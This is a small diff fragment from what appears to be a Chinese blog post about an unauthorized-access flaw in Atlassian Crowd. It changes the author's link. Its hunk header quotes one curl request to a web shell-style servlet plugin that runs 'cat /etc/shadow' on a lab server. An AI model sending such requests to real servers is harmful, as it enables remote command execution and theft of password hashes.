@@ -61,6 +61,6 @@ curl http://192.168.0.100:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow
 
 ---
 
-> 作者: [剑胆琴心](http://geoer.cn)  
+> 作者: [剑胆琴心](http://shuai06.github.io)  
 > URL: https://shuai06.github.io/atlassian-crowd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/  
 
